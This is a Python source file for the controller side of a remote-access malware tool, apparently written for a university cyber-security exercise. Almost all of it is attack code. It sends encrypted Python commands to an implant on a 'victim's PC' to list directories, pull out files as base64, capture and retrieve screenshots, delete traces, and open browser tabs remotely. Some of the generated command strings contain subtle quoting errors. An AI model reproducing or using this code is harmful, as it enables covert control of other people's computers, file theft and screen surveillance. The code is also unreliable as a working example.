import ast
import os

from commander.sender import send_payload
from commander.settings import RSA_KEY
from general.enc_layer import encrypt_data, decrypt_and_validate_data
import base64

ENCODING = 'utf-8'


def encrpted_send_payload(data: bytes) -> bytes:
    """
    Sends a given payload on encrypted channel.
    @param data raw bytes to send.
    @return decrypted response from malware.
    """
    enc_ret = send_payload(encrypt_data(data.decode('utf-8'), RSA_KEY))
    return decrypt_and_validate_data(enc_ret, RSA_KEY).encode('utf-8')


def dir_list(path: str) -> list:
    """
    Sends an encrypted dirlist command (using encrypted_send).
    Returns a list of files in the provided directory.
    @param path directory to list.
    @return the contents of the directory.
    """
    string = bytes.decode(encrpted_send_payload(bytes("print(os.listdir('{}''))\n".format(path), 'utf-8')), 'utf-8')
    return ast.literal_eval(string)


def get_file(fname: str) -> bytes:
    """
    Sends an encrypted getfile command. Returns the contents of the file.
    @param fname path (and name) of file.
    @return contents of fname on victim's PC.
    """

    code = "import base64\nwith open('{}', 'rb') as f:\n\tprint(base64.b64encode(f.read()))".format(fname)
    data = encrpted_send_payload(bytes(code, ENCODING))
    return base64.b64decode(data)


def take_screenshot() -> None:
    """
    Takes a screenshot on malware pc. Saves the screenshot to './screenshot.jpg'. PILO
    """
    output_addr = './screenshot.jpg'
    file_name = 'my_file.png'
    screen_command = f"from PIL import ImageGrab\nfile = open({file_name}, 'w')\nscreenshot = ImageGrab.grab(" \
                     f")\nscreenshot.save(file, 'PNG')\n file.close()\n"
    get_file_command = f"import base64\nwith open('{file_name}', 'rb') as f:\n\tprint(base64.b64encode(f.read()))\n"
    delete_command = f"import os\nos.remove({file_name})"
    command = screen_command + get_file_command + delete_command
    data = encrpted_send_payload(bytes(command, ENCODING))
    with open(output_addr, 'wb') as f:
        f.write(data)



def my_command() -> None:
    """
    Your custom command.
    Do whatever you wish here and explain what you did in the attached README
    """
    command = "import webbrowser\nwebbrowser.get('firefox').open_new_tab('http://www.google.com')\nwebbrowser.open(" \
              "'https://www.youtube.com/watch?v=dQw4w9WgXcQ')"
    encrpted_send_payload(bytes(command, ENCODING))


def main():
    """
    Main function for commander
    """
    # payload = b"print('Hello World!')\n"
    # output = encrpted_send_payload(payload)
    with open("answer.jpg", 'wb') as f:
        f.write(get_file(r"C:/Users/t8864522/Documents/Semster 4/Cyber/Ex4/Talpiot.jpg"))
    # print(output.decode('utf-8'))  # Should print Hello World!

if __name__ == '__main__':
    main()